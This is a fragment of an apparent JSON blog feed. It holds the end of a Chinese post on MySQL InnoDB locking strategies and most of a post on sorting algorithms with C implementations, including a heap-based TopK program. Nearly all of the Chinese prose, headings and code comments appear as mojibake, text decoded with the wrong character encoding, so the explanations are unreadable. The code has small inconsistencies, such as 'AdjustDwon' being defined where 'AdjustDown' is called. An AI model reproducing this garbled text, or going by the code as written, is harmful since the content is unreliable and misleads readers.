id=\"æœ€ä½³æ–¹æ¡ˆ\">æœ€ä½³æ–¹æ¡ˆ</h5>\n<p>å®é™…ä½¿ç”¨ä¸­å¯ä»¥ç›‘æ§ä¸šåŠ¡çš„å†²çªæ¦‚ç‡æ¥ä½œä¸ºä¾æ®ä»è€ŒåŠ¨æ€è°ƒæ•´é”ç­–ç•¥ã€‚<br />\nç”¨Javaå®ç°ä¸€ä¸ªä½¿ç”¨ä¾‹å­ï¼ˆä¸å«å®ç°ï¼‰ï¼š</p>\n<pre><code class=\"language-java\">// æ™ºèƒ½é”é€‰æ‹©ç­–ç•¥\npublic void updateData(Data data) {\n    // æ ¹æ®å†²çªæ¦‚ç‡åŠ¨æ€é€‰æ‹©é”ç­–ç•¥\n    if (getConflictRate() &gt; 0.1) {  // å†²çªç‡ &gt; 10%\n        // åˆ‡æ¢åˆ°æ‚²è§‚é”\n        usePessimisticLock(data);\n    } else {\n        // ä½¿ç”¨ä¹è§‚é”\n        useOptimisticLock(data);\n    }\n}\n</code></pre>\n<p>åœ¨è¿™ç§æ–¹æ¡ˆä¸­ä¸å…‰è¦ç›‘æ§å†²çªç‡ï¼Œè¿˜æœ‰å…¶ä»–éœ€è¦å¤„ç†çš„ç»†èŠ‚ç‚¹ã€‚</p>\n<ul>\n<li><strong>ç›‘æ§å†²çªç‡ï¼šæ ¹æ®å®é™…æƒ…å†µåŠ¨æ€è°ƒæ•´é”ç­–ç•¥</strong></li>\n<li><strong>è®¾ç½®é‡è¯•ä¸Šé™ï¼šä¹è§‚é”é¿å…æ— é™é‡è¯•</strong></li>\n<li><strong>é™çº§æœºåˆ¶ï¼šä¹è§‚é”å¤±è´¥æ¬¡æ•°è¿‡å¤šæ—¶é™çº§åˆ°æ‚²è§‚é”</strong></li>\n<li><strong>ç‰ˆæœ¬å·ç®¡ç†ï¼šç¡®ä¿ç‰ˆæœ¬å·å­—æ®µçš„ç´¢å¼•ä¼˜åŒ–</strong></li>\n<li><strong>æ­»é”é¢„é˜²ï¼šæ‚²è§‚é”åœºæ™¯ä¸‹æŒ‰å›ºå®šé¡ºåºåŠ é”</strong></li>\n</ul>\n<h3 id=\"æ€»ç»“\">æ€»ç»“</h3>\n<p>MySQL InnoDB çš„é”ä½“ç³»å¯ä»¥æ¦‚æ‹¬ä¸ºâ€œ<strong>ä¸¤ç±»æ€æƒ³ï¼ˆæ‚²è§‚ vs ä¹è§‚ï¼‰</strong>ã€<strong>ä¸‰ç§ç²’åº¦ï¼ˆè¡¨ã€é¡µã€è¡Œï¼‰</strong>ã€<strong>å››ç§å¸¸ç”¨ç®—æ³•ï¼ˆRecord / Gap / Next-Key / Insert Intentionï¼‰</strong>â€ã€‚<br />\nç†è§£å®ƒä»¬çš„æ ¸å¿ƒæ˜¯æŠ“ä½ä¸¤æ¡ä¸»çº¿ï¼š</p>\n<ol>\n<li><strong>éš”ç¦»çº§åˆ«å†³å®šé”çš„â€œèŒƒå›´â€â€”â€”RR ç”¨ Next-Key Lock é˜²å¹»è¯»ï¼ŒRC ç”¨ Record Lock æå¹¶å‘ï¼›</strong></li>\n<li><strong>ç´¢å¼•å†³å®šé”çš„â€œä½ç½®â€â€”â€”é”æ°¸è¿œåŠ åœ¨ç´¢å¼•ä¸Šï¼Œæ— ç´¢å¼•åˆ™é€€åŒ–ä¸ºè¡¨é”æˆ–éšè—èšç°‡ç´¢å¼•é”ã€‚</strong></li>\n</ol>\n<p>å®é™…é€‰å‹æ—¶ï¼Œå…ˆé‡åŒ–å†²çªæ¦‚ç‡ä¸ä¸€è‡´æ€§è¦æ±‚ï¼š</p>\n<ul>\n<li>å†²çªé«˜ã€ä¸´ç•ŒåŒºé•¿ã€å¼ºä¸€è‡´ â†’ æ‚²è§‚é”ï¼ˆFOR UPDATE / LOCK TABLESï¼‰ï¼›</li>\n<li>å†²çªä½ã€è¯»å¤šå†™å°‘ã€å¯é‡è¯• â†’ ä¹è§‚é”ï¼ˆCAS+ç‰ˆæœ¬å·/æ—¶é—´æˆ³ï¼‰ã€‚</li>\n</ul>\n<p>æœ€ååˆ«å¿˜äº†ç›‘æ§ï¼šæŠŠâ€œå†²çªç‡ã€æ­»é”æ¬¡æ•°ã€é‡è¯•æˆåŠŸç‡â€åšæˆä»ªè¡¨ç›˜ï¼Œè®©é”ç­–ç•¥éšä¸šåŠ¡æµé‡åŠ¨æ€ä¼¸ç¼©ï¼Œæ‰æ˜¯çœŸæ­£çš„â€œé«˜å¹¶å‘æ­£ç¡®å§¿åŠ¿â€ã€‚</p>\n\n</div>\n<div id=\"MySignature\">\n    <div style=\"float: left; letter-spacing: 1px; font-size: 13px;\"><p><strong>ä½œè€…ï¼š</strong><a href=\"http://www.cnblogs.com/jimoer/\">çºªè«</a>\n<br />æ¬¢è¿ä»»ä½•å½¢å¼çš„è½¬è½½ï¼Œä½†è¯·åŠ¡å¿…æ³¨æ˜å‡ºå¤„ã€‚<br />\né™äºæœ¬äººæ°´å¹³ï¼Œå¦‚æœæ–‡ç« å’Œä»£ç æœ‰è¡¨è¿°ä¸å½“ä¹‹å¤„ï¼Œè¿˜è¯·ä¸åèµæ•™ã€‚</p>\n<!-- åˆ†äº«å›¾æ ‡å¼€å§‹ -->\n<p>æ¬¢è¿æ‰«æäºŒç»´ç å…³æ³¨å…¬ä¼—å·ï¼š<strong>Jimoer</strong></p>\n<p>æ–‡ç« ä¼šåŒæ­¥åˆ°å…¬ä¼—å·ä¸Šé¢ï¼Œå¤§å®¶ä¸€èµ·æˆé•¿ï¼Œå…±åŒæå‡æŠ€æœ¯èƒ½åŠ›ã€‚</p>\n<p><strong>å£°æ´åšä¸»ï¼š</strong>å¦‚æœæ‚¨è§‰å¾—æ–‡ç« å¯¹æ‚¨æœ‰å¸®åŠ©ï¼Œå¯ä»¥ç‚¹å‡»æ–‡ç« å³ä¸‹è§’ã€<a href=\"\" style=\"font-size: 14pt;\">æ¨è</a>ã€‘ä¸€ä¸‹ã€‚</p>\n<p>æ‚¨çš„é¼“åŠ±æ˜¯åšä¸»çš„æœ€å¤§åŠ¨åŠ›ï¼</p>\n</div>\n<div style=\"float: right;\">\n<img alt=\"å¾®ä¿¡å…¬ä¼—å·\" src=\"https://img2018.cnblogs.com/blog/772743/201909/772743-20190904004009398-659676330.png\" /></div>\n<!-- åˆ†äº«å›¾æ ‡ç»“æŸ -->\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-20 20:20</span>&nbsp;\n<a href=\"https://www.cnblogs.com/jimoer\">çºªè«</a>&nbsp;\né˜…è¯»(<span id=\"post_view_count\">0</span>)&nbsp;\nè¯„è®º(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">æ”¶è—</a>&nbsp;\n<a href=\"\">ä¸¾æŠ¥</a>\n</div>"
    },
    {
      "title": "ã€Šæ’åºç®—æ³•å…¨è§£æï¼šä»åŸºç¡€åˆ°ä¼˜åŒ–ï¼Œä¸€æ–‡åƒé€å…«å¤§æ’åºï¼ã€‹",
      "link": "https://www.cnblogs.com/niukwuy/p/19507074/sort-algorithms-full-guide",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/niukwuy/p/19507074/sort-algorithms-full-guide\" id=\"cb_post_title_url\" title=\"å‘å¸ƒäº 2026-01-20 20:19\">\n    <span>ã€Šæ’åºç®—æ³•å…¨è§£æï¼šä»åŸºç¡€åˆ°ä¼˜åŒ–ï¼Œä¸€æ–‡åƒé€å…«å¤§æ’åºï¼ã€‹</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        æœ¬æ–‡è¯¦è§£å†’æ³¡ã€é€‰æ‹©ã€æ’å…¥ç­‰åŸºç¡€æ’åºï¼Œä»¥åŠå¿«æ’ã€å½’å¹¶ã€å †æ’ã€å¸Œå°”ç­‰é«˜çº§æ’åºçš„åŸç†ã€cè¯­è¨€ä»£ç å®ç°ï¼Œå¯¹æ¯”å„ç®—æ³•æ—¶é—´å¤æ‚è¯»/ç©ºé—´å¤æ‚åº¦ï¼Œé™„ä»£ç è¯¦ç»†æ³¨é‡Šï¼Œå¸®ä½ å½»åº•ææ‡‚æ’åºï¼\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"ä¸€ä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦è¯»æ‡‚æ’åº--ä¸æ­¢äºæ’é¡ºåºçš„æ ¸å¿ƒä»·å€¼\">ä¸€ã€ä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦è¯»æ‡‚æ’åº--ä¸æ­¢äº\"æ’é¡ºåº\"çš„æ ¸å¿ƒä»·å€¼</h1>\n<p>æ’åºæ˜¯è®¡ç®—æœºç§‘å­¦ä¸­æœ€åŸºç¡€ä¹Ÿæ˜¯æœ€æ ¸å¿ƒçš„æ“ä½œä¹‹ä¸€ï¼Œçœ‹ä¼¼åªæ˜¯å°†æ•°æ®æ’æˆæœ‰åºï¼Œå®åˆ™è´¯ç©¿æˆ‘ä»¬ç”Ÿæ´»ä¸­çš„æ¯ä¸ªè§’è½ï¼Œæ‹¼å¤šå¤šä¸Šçš„ä»·æ ¼æ’åºï¼Œæœç´¢å¼•æ“ä¸Šçš„æƒé‡æ’åºï¼Œç”šè‡³æ˜¯æœ€å¸¸è§çš„æ‰‹æœºç›¸å†Œä¸Šçš„æ—¶é—´æ’åºèƒŒåéƒ½ä¾èµ–ç€æ’åºç®—æ³•çš„æ”¯æ’‘<br />\nä½†å¤§å¤šæ•°åˆå­¦è€…å¾€å¾€ä¼šé™·å…¥\"æ­»è®°ä»£ç \"çš„è¯¯åŒºï¼Œè€Œå¿½ç•¥äº†æ’åºçš„æœ¬è´¨--é€šè¿‡é«˜æ•ˆçš„æ¯”è¾ƒä¸äº¤æ¢ï¼Œé™ä½æ•°æ®çš„æ— åºåº¦</p>\n<h3 id=\"æœ¬æ–‡å°†ä»æ’åºç®—æ³•çš„è®¾è®¡æ€è·¯åº•å±‚åŸç†æ—¶é—´å¤æ‚åº¦ä»¥åŠé€‚ç”¨åœºæ™¯æ¥å¸®ä½ å½»åº•ææ‡‚æ’åº\">æœ¬æ–‡å°†ä»æ’åºç®—æ³•çš„è®¾è®¡æ€è·¯ï¼Œåº•å±‚åŸç†ï¼Œæ—¶é—´å¤æ‚åº¦ä»¥åŠé€‚ç”¨åœºæ™¯æ¥å¸®ä½ å½»åº•ææ‡‚æ’åº</h3>\n<h3 id=\"æ ¸å¿ƒå¯¹æ¯”æ€»è¡¨\">æ ¸å¿ƒå¯¹æ¯”æ€»è¡¨:</h3>\n<p><img alt=\"å±å¹•æˆªå›¾ 2026-01-20 172516\" class=\"lazyload\" /></p>\n<h1 id=\"äºŒå¿…å­¦æ’åºç®—æ³•åº•å±‚é€»è¾‘ä»£ç å®ç°é™„ä¸Šè¯¦ç»†æ³¨é‡Š\">äºŒã€å¿…å­¦æ’åºç®—æ³•:åº•å±‚é€»è¾‘+ä»£ç å®ç°(é™„ä¸Šè¯¦ç»†æ³¨é‡Š)</h1>\n<p>æ³¨:ä»¥ä¸‹æ’åºé»˜è®¤æ˜¯æ’å‡åº</p>\n<h2 id=\"å†’æ³¡æ’åº\">å†’æ³¡æ’åº</h2>\n<h3 id=\"æ ¸å¿ƒæ€æƒ³\">æ ¸å¿ƒæ€æƒ³:</h3>\n<p>é€šè¿‡é‡å¤çš„éå†æ•°ç»„ï¼Œæ¯æ¬¡æ¯”è¾ƒä¸¤ä¸¤ç›¸é‚»çš„æ•°æ®ï¼Œè‹¥é¡ºåºæ­£ç¡®å°±ä¸äº¤æ¢ï¼Œé¡ºåºé”™è¯¯å°±äº¤æ¢ï¼Œæ¯æ¬¡éå†å°±å®Œæˆä¸€ä¸ªæ•°æ®çš„æ’åº(æœ€åä¸€ä¸ªæ•°æ®æˆä¸ºæœ€å¤§/æœ€å°çš„æ•°æ®)</p>\n<h3 id=\"ç‰¹ç‚¹\">ç‰¹ç‚¹ï¼š</h3>\n<p>ç¨³å®šæ’åº(ç›¸ç­‰å…ƒç´ é¡ºåºä¸å˜)ï¼Œæ—¶é—´å¤æ‚åº¦O(N^2)ï¼Œç©ºé—´å¤æ‚åº¦O(1)</p>\n<h3 id=\"é€‚ç”¨åœºæ™¯\">é€‚ç”¨åœºæ™¯:</h3>\n<p>æ— å®è·µæ„ä¹‰ï¼Œä»…æœ‰æ•™å­¦æ„ä¹‰</p>\n<h3 id=\"æ—¶é—´å¤æ‚åº¦\">æ—¶é—´å¤æ‚åº¦:</h3>\n<p>è€ƒè™‘æœ€åçš„æƒ…å†µ:é€†åº<br />\nå‡è®¾æœ‰nä¸ªæ•°æ®ï¼Œç¬¬ä¸€ä¸ªæ•°æ®æœ€å¤§ï¼Œé€šè¿‡ä¸¤ä¸¤äº¤æ¢ï¼Œè¦äº¤æ¢n-1æ¬¡æ‰èƒ½äº¤æ¢åˆ°æœ€åä¸€ä¸ªï¼Œæ­¤æ—¶æ¬¡å¤§çš„æ•°æ®è¢«äº¤æ¢åˆ°ç¬¬ä¸€ä¸ªï¼Œæœ€åä¸€ä¸ªæ•°æ®å·²ç»ç¡®å®šï¼Œæ‰€ä»¥è¦äº¤æ¢n-2æ¬¡æ‰èƒ½äº¤æ¢åˆ°å€’æ•°ç¬¬äºŒä¸ªï¼Œä¾æ¬¡ç±»æ¨ï¼Œå®é™…ä¸Šæ˜¯ä¸€ä¸ªç­‰å·®æ•°åˆ—(n-1+n-2+n-3+â€¦â€¦+1) = (n(n-1))/2ï¼Œæ•…æ—¶é—´å¤æ‚åº¦ä¸ºO(N^2)</p>\n<h3 id=\"ä»£ç å®ç°\">ä»£ç å®ç°ï¼š</h3>\n<details>\nç‚¹å‡»æŸ¥çœ‹ä»£ç \n<pre><code>void Swap(int* x, int* y) {\n\tint tmp = *x;\n\t*x = *y;\n\t*y = tmp;\n}\n\nvoid BubbleSort(int* a, int size) {\n\tfor (int j = 0; j &lt; size; j++) {\n\t\tint Flag = 0;\n\t\tfor (int i = 0; i &lt; size - j - 1; i++) {\n\t\t\tif (a[i] &gt; a[i + 1]) {\n\t\t\t\tFlag = 1;\n\t\t\t\tSwap(&amp;a[i], &amp;a[i + 1]);\n\t\t\t}\n\t\t}\n                //æ­¤æ—¶ä¸€æ¬¡éå†æ²¡æœ‰ä¸¤ä¸¤äº¤æ¢ï¼Œè¯´æ˜å·²ç»æœ‰åºäº†\n\t\tif (Flag == 0) {\n\t\t\tbreak;\n\t\t}\n\t}\n}\n</code></pre>\n</details>\n<h2 id=\"å †æ’åº\">å †æ’åº</h2>\n<h3 id=\"æ ¸å¿ƒæ€æƒ³-1\">æ ¸å¿ƒæ€æƒ³:</h3>\n<p>å…ˆç”¨å‘ä¸‹è°ƒæ•´æ³•å»ºå¤§å †ï¼Œæ­¤æ—¶å †é¡¶å…ƒç´ æ˜¯æœ€å¤§çš„æ•°æ®ï¼Œç„¶åä¸æœ€åä¸€ä¸ªå…ƒç´ äº¤æ¢ï¼Œæœ€åä¸€ä¸ªå…ƒç´ å˜æˆäº†æœ€å¤§çš„æ•°æ®ï¼Œæ³¨æ„size--ï¼Œå†å‘ä¸‹è°ƒæ•´æ³•å»ºå †ï¼Œå¯»æ‰¾æ¬¡å¤§çš„å…ƒç´ ï¼Œç»§ç»­äº¤æ¢ï¼Œä¾æ¬¡ç±»æ¨â€¦â€¦</p>\n<h3 id=\"ç‰¹ç‚¹-1\">ç‰¹ç‚¹:</h3>\n<p>ä¸ç¨³å®šæ’åº(ä¼šè¿›è¡Œè·¨ä½ç½®äº¤æ¢ï¼Œå¯èƒ½æ‰“ä¹±åŸç›¸ç­‰æ•°æ®çš„ç›¸å¯¹ä½ç½®)ï¼Œæ—¶é—´å¤æ‚åº¦ä¸ºO(N*logN)ï¼Œç©ºé—´å¤æ‚åº¦ä¸ºO(1)</p>\n<h3 id=\"é€‚ç”¨åœºæ™¯-1\">é€‚ç”¨åœºæ™¯:</h3>\n<p>æ•°æ®é‡è¾ƒå¤§ä¸”ä¸éœ€è¦æ’åºç»“æœç¨³å®šçš„åœºæ™¯<br />\nå¯ä»¥è§£å†³TopKé—®é¢˜</p><details><p></p>\nç‚¹å‡»æŸ¥çœ‹ä»£ç \n<pre><code>void GiveFile() {\n      //å»ºç«‹æ–‡ä»¶\n\tconst char* filepath = \"randomdata.txt\";\n\tFILE* fin = fopen(filepath, \"w\");\n\tif (fin == NULL) {\n\t\tperror(\"fopen():error\");\n\t\treturn ;\n\t}\n\tint size = 100000;\n\tfor (int i = 0; i &lt; size; i++) {\n\t\tint random = rand() + i;\n\t\tfprintf(fin, \"%d\\n\", random);\n\t}\n\tfclose(fin);\n}\n\nvoid FindTopK() {\n\tconst char* filepath = \"randomdata.txt\";\n\tFILE* fout = fopen(filepath, \"r\");\n\tif (fout == NULL) {\n\t\tperror(\"fopen():error\");\n\t\treturn;\n\t}\n\tint k = 0;\n\tprintf(\"è¯·è¾“å…¥k:\\n\");\n\tscanf(\"%d\", &amp;k);\n\t//å°†å‰kä¸ªæ•°æ”¾è¿›äº†æ•°ç»„ä¸­\n\tint* a = (int*)malloc(k * sizeof(int));\n\tif (a == NULL) {\n\t\tperror(\"malloc fail\");\n\t\treturn;\n\t}\n\tfor (int i = 0; i &lt; k; i++) {\n\t\tfscanf(fout, \"%d\", &amp;a[i]);\n\t}\n\t//è°ƒæˆå°å †\n\tfor (int i = (k - 2) / 2; i &gt;= 0; i--) {\n\t\tAdjustDown(a, k, i);\n\t}\n\t//å°†æ–‡ä»¶ä¸­çš„æ•°æ®ä¾æ¬¡ä¸å †é¡¶æ•°æ®æ¯”è¾ƒ\n\tint tmp = 0;\n\twhile (fscanf(fout, \"%d\", &amp;tmp)==1) {\n\t\tif (tmp &gt; a[0]) {\n\t\t\ta[0] = tmp;\n\t\t\tAdjustDown(a, k, 0);\n\t\t}\n\t}\n\t//è¿™ä¸ªæ—¶å€™å·²ç»è·å¾—äº†å‰kå¤§çš„æ•°ï¼Œä½†ä¸åˆ†å…ˆå\n\tint tmpk = k;\n\t//æœ€åä¸€æ¬¡æ’å…¥åæ•´ä½“ä¸ä¸€å®šæ»¡è¶³å°å †\n\tAdjustDown(a, k, 0);\n\t//è¿™ä¸ªæ—¶å€™å·²ç»æ»¡è¶³å°å †ï¼Œç”¨å †æ’åº\n\tfor (int i = 0; i &lt; tmpk;i++) {\n\t\tSwap(&amp;a[0], &amp;a[k - 1]);\n\t\tk--;\n\t\tAdjustDown(a, k, 0);\n\t}\n\tfor (int i = 0; i &lt; tmpk; i++) {\n\t\tprintf(\"%d \", a[i]);\n\t}\n\tfclose(fout);\n}\n\n//æ‰¾å‡º10ä¸‡ä¸ªæ•°ä¸­å‰kå¤§çš„æ•°\nint main() {\n\tsrand((unsigned int)time(NULL));\n\t//æ–¹æ³•ä¸€:å»ºç«‹å¤§å †ï¼Œå–å †é¡¶çš„æ•°æ®ï¼Œç„¶åpopï¼Œç”¨å‘ä¸‹è°ƒæ•´ç®—æ³•ä½¿å †é¡¶æ•°æ®æˆä¸ºç¬¬äºŒå¤§çš„ï¼Œç»§ç»­å–â€¦â€¦\n\t//è¿™æ ·çš„é—®é¢˜æ˜¯ç©ºé—´å¤æ‚åº¦ä¸ºO(N)\n\n\t//æ–¹æ³•äºŒ:å»ºç«‹å‰kä¸ªæ•°çš„å°å †ï¼Œå…ˆæŠŠå‰kä¸ªæ•°æ”¾è¿›å»ï¼Œç„¶åå°†å‰©ä¸‹çš„æ•°æ®ä¾æ¬¡ä¸å †é¡¶æ•°æ®æ¯”è¾ƒï¼Œå¦‚æœæ¯”å †é¡¶æ•°æ®å¤§ï¼Œè¿›æ ˆï¼Œç„¶åç”¨å‘ä¸‹è°ƒæ•´æ³•è°ƒæˆå°å †\n\t//æœ€åå †é‡Œçš„kä¸ªå…ƒç´ å°±æ˜¯å‰kå¤§çš„æ•°(ä¸åˆ†é¡ºåº)\n\t//è¿˜å¯ä»¥å†ç”¨ä¸€æ¬¡å‘ä¸‹è°ƒæ•´æ³•è°ƒæ•´è‡³å°å †ï¼Œå†ç”¨å †æ’åº\n\tGiveFile();\n\tFindTopK();\n\treturn 0;\n}\n</code></pre>\n</details>\n<h3 id=\"æ—¶é—´å¤æ‚åº¦-1\">æ—¶é—´å¤æ‚åº¦:</h3>\n<p>å‘ä¸‹è°ƒæ•´å»ºå †:</p>\n<p><img alt=\"å±å¹•æˆªå›¾ 2026-01-20 110150\" class=\"lazyload\" /><br />\næ’åº:</p>\n<p><img alt=\"å±å¹•æˆªå›¾ 2026-01-20 111515\" class=\"lazyload\" /></p>\n<h3 id=\"ä»£ç å®ç°-1\">ä»£ç å®ç°:</h3>\n<details>\nç‚¹å‡»æŸ¥çœ‹ä»£ç \n<pre><code>void AdjustDwon(int* a, int size, int parent) {\n\tint morechild = 2 * parent + 1;\n\twhile (morechild &lt; size) {\n\t\t//æ‰¾åˆ°è¾ƒå¤§å­èŠ‚ç‚¹\n\t\tif (morechild + 1 &lt; size &amp;&amp; a[morechild] &lt; a[morechild + 1]) {\n\t\t\tmorechild++;\n\t\t}\n\t\tif (a[morechild] &gt; a[parent]) {\n\t\t\tSwap(&amp;a[morechild], &amp;a[parent]);\n\t\t\tparent = morechild;\n\t\t\tmorechild = 2 * parent + 1;\n\t\t}\n\t\telse {\n\t\t\tbreak;\n\t\t}\n\t}\n}\n\n//æ—¶é—´å¤æ‚åº¦ä¸ºO(N*logN)\nvoid HeapSort(int* a, int size) {\n\t//å…ˆç”¨å‘ä¸‹è°ƒæ•´æ³•å»ºå¤§å †\n\tint parent = (size - 2) / 2;\n\twhile(parent &gt;= 0) {\n\t\tAdjustDwon(a, size, parent);\n\t\tparent--;\n\t}\n\tint tmpsize = size;\n\tfor (int i = 0; i &lt; tmpsize; i++) {\n\t\tSwap(&amp;a[0], &amp;a[size - 1]);\n\t\tsize--;\n\t\tAdjustDwon(a, size, 0);\n\t}\n}\n</code></pre>\n</details>\n<h2 id=\"æ’å…¥æ’åº\">æ’å…¥æ’åº</h2>\n<h3 id=\"æ ¸å¿ƒæ€æƒ³-2\">æ ¸å¿ƒæ€æƒ³:</h3>\n<p>endå‰é¢çš„æ•°æ®å·²ç»å®ç°äº†æœ‰åºï¼Œæ–°æ’å…¥çš„æ•°æ®éœ€è¦ä¸å‰é¢çš„æ•°æ®ä¾æ¬¡æ¯”è¾ƒï¼Œå¦‚æœæ–°æ•°æ®è¾ƒå°ï¼Œé‚£ä¹ˆåŸæ¥çš„æ•°æ®å¾€å‰æŒªï¼Œç›´åˆ°æ–°æ•°æ®æ¯”åŸæ•°æ®å¤§ä¸ºæ­¢ï¼Œä»è€Œå®ç°äº†æœ‰åº</p>\n<h3 id=\"ç‰¹ç‚¹-2\">ç‰¹ç‚¹:</h3>\n<p>ç¨³å®šæ’åºï¼Œæ—¶é—´å¤æ‚åº¦ä¸ºO(N<sup>2),é€‚åº”æ€§è¾ƒå¥½(å®é™…ä¸Šå¾€å¾€ä»‹äºO(N</sup>2)ä¸O(N)ä¹‹é—´)ï¼Œç©ºé—´å¤æ‚åº¦ä¸ºO(1)</p>\n<h3 id=\"é€‚ç”¨åœºæ™¯-2\">é€‚ç”¨åœºæ™¯:</h3>\n<p>å°è§„æ¨¡æ•°æ®æ’åº(å¦‚å¿«æ’çš„å°åŒºé—´ä¼˜åŒ–)ï¼Œè¿‘ä¼¼æœ‰åºæ•°æ®æ’åº</p>\n<h3 id=\"æ—¶é—´å¤æ‚åº¦-2\">æ—¶é—´å¤æ‚åº¦:</h3>\n<p><img alt=\"å±å¹•æˆªå›¾ 2026-01-20 114001\" class=\"lazyload\" /></p>\n<h3 id=\"ä»£ç å®ç°-2\">ä»£ç å®ç°:</h3>\n<details>\nç‚¹å‡»æŸ¥çœ‹ä»£ç \n<pre><code>void InsertSort(int* a, int size) {\n\t//endå‰é¢çš„å·²ç»æ˜¯æœ‰åºäº†ï¼Œç„¶åå°†end+1ä¸å‰é¢çš„ä¾æ¬¡æ¯”è¾ƒ\n\tfor (int i = 0; i &lt; size - 1; i++) {\n\t\tint end = i;\n\t\tint tmp = a[end + 1];\n\t\twhile (end &gt;= 0) {\n\t\t\tif (tmp &lt; a[end]) {\n\t\t\t\ta[end + 1] = a[end];\n\t\t\t\tend--;\n\t\t\t}\n\t\t\telse {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\ta[end + 1] = tmp;\n\t}\n}\n</code></pre>\n</details>\n<h2 id=\"é€‰æ‹©æ’åº\">é€‰æ‹©æ’åº</h2>\n<h3 id=\"æ ¸å¿ƒæ€æƒ³-3\">æ ¸å¿ƒæ€æƒ³:</h3>\n<p>å¤šæ¬¡éå†ï¼Œæ‰¾åˆ°æœ€å¤§å€¼ä¸æœ€å°å€¼ï¼Œå°†æœ€å¤§å€¼ä¸æœ«å°¾å€¼äº¤æ¢ï¼Œå°†æœ€å°å€¼ä¸å¼€å¤´å€¼äº¤æ¢</p>\n<h3 id=\"ç‰¹ç‚¹-3\">ç‰¹ç‚¹:</h3>\n<p>ä¸ç¨³å®šæ’åº(æ¶‰åŠè·¨ä½ç½®äº¤æ¢)ï¼Œæ—¶é—´å¤æ‚åº¦ä¸ºO(N^2)ï¼Œç©ºé—´å¤æ‚åº¦ä¸ºO(1)</p>\n<h3 id=\"é€‚ç”¨åœºæ™¯-3\">é€‚ç”¨åœºæ™¯:</h3>\n<p>æ— å®é™…æ„ä¹‰ï¼Œä»…æœ‰æ•™å­¦æ„ä¹‰</p>\n<h3 id=\"æ—¶é—´å¤æ‚åº¦-3\">æ—¶é—´å¤æ‚åº¦:</h3>\n<p><img alt=\"å±å¹•æˆªå›¾ 2026-01-20 115900\" class=\"lazyload\" /></p>\n<h3 id=\"é€‚ç”¨åœºæ™¯-4\">é€‚ç”¨åœºæ™¯:</h3>\n<p>é€‚åº”æ€§å·®ï¼Œæ— æ³•åˆ¤æ–­æ˜¯å¦æœ‰åºï¼Œæ—¶é—´å¤æ‚åº¦ä¸€èˆ¬éƒ½åœ¨O(N^2)ï¼Œä»…å…·æœ‰æ•™å­¦æ„ä¹‰</p>\n<h3 id=\"ä»£ç å®ç°-3\">ä»£ç å®ç°:</h3>\n<details>\nç‚¹å‡»æŸ¥çœ‹ä»£ç \n<pre><code>void SelectSort(int* a, int size) {\n\tint begin = 0;\n\tint end = size - 1;\n\t//å°†æœ€å¤§ä¸æœ€å°åˆ†åˆ«æ”¾åœ¨ä¸¤è¾¹\n\twhile (begin &lt;= end) {\n\t\tint mini = begin;\n\t\tint maxi = begin;\n\t\tfor (int i = begin + 1; i &lt;= end; i++) {//åº”è¯¥æ˜¯&lt;=\n\t\t\tif (a[i] &gt; a[maxi]) {\n\t\t\t\tmaxi = i;\n\t\t\t}\n\t\t\tif (a[i] &lt; a[mini]) {\n\t\t\t\tmini = i;\n\t\t\t}\n\t\t}\n\t\tSwap(&amp;a[begin], &amp;a[mini]);//åº”è¯¥ç”¨äº¤æ¢å‡½æ•°ï¼Œå¦åˆ™ä¼šè¦†ç›–\n\t\tif (begin == maxi)\n\t\t\tmaxi = mini;//è¿™é‡Œbeginå¯èƒ½ä¸maxiç›¸åŒï¼Œminiçš„å€¼å°±ä¼šè¢«äº¤æ¢èµ°ï¼Œ\n\t\t//è¿™é‡Œå³ä½¿end==miniä¹Ÿæ²¡å…³ç³»ï¼Œå› ä¸ºä¸å½±å“ååºçš„æ’åº\n\t\tSwap(&amp;a[end], &amp;a[maxi]);\n\t\tbegin++;\n\t\tend--;\n\t}\n}\n</code></pre>\n</details>\n<h2 id=\"å¸Œå°”æ’åº\">å¸Œå°”æ’åº</h2>\n<h3 id=\"æ ¸å¿ƒæ€æƒ³-4\">æ ¸å¿ƒæ€æƒ³:</h3>\n<p>å…¶åº•å±‚ä»ç„¶æ˜¯æ’å…¥æ’åºï¼Œä½†æ’å…¥æ’åºæœ‰ä¸€ä¸ªç¼ºç‚¹:åœ¨å¤„ç†é€†åºæˆ–æ¥è¿‘é€†åºçš„æ—¶å€™æ—¶é—´å¤æ‚åº¦åé«˜ï¼Œæ‰€ä»¥åœ¨æ’å…¥æ’åºå‰å…ˆè¿›è¡Œé¢„æ’åºï¼Œä½¿å¤§çš„æ•°å°½é‡æ’åœ¨åé¢</p>\n<h3 id=\"ç‰¹ç‚¹-4\">ç‰¹ç‚¹:</h3>\n<p>ä¸ç¨³å®šæ’åºï¼Œæ—¶é—´å¤æ‚åº¦çº¦ä¸ºO(N^(1.3))ï¼Œç©ºé—´å¤æ‚åº¦ä¸ºO(1)</p>\n<h3 id=\"é€‚ç”¨åœºæ™¯-5\">é€‚ç”¨åœºæ™¯:</h3>\n<p>ä¸­ç­‰è§„æ¨¡æ•°æ®çš„é«˜æ•ˆæ’åºï¼Œä¸”å¯¹å†…å­˜æ¶ˆè€—è¦æ±‚è¾ƒä½</p>\n<h3 id=\"æ—¶é—´å¤æ‚åº¦-4\">æ—¶é—´å¤æ‚åº¦:</h3>\n<p>å¸Œå°”æ’åºçš„æ—¶é—´å¤æ‚åº¦å—å¢é‡åºåˆ—çš„å½±å“è¾ƒå¤§ï¼Œé€‰æ‹©åˆé€‚çš„å¢é‡åºåˆ—å¯ä»¥æ˜¾è‘—æé«˜æ’åºæ•ˆç‡ã€‚ä½œè€…æ°´å¹³æœ‰é™ï¼Œæ— æ³•æ¨å¯¼</p>\n<h3 id=\"ä»£ç å®ç°-4\">ä»£ç 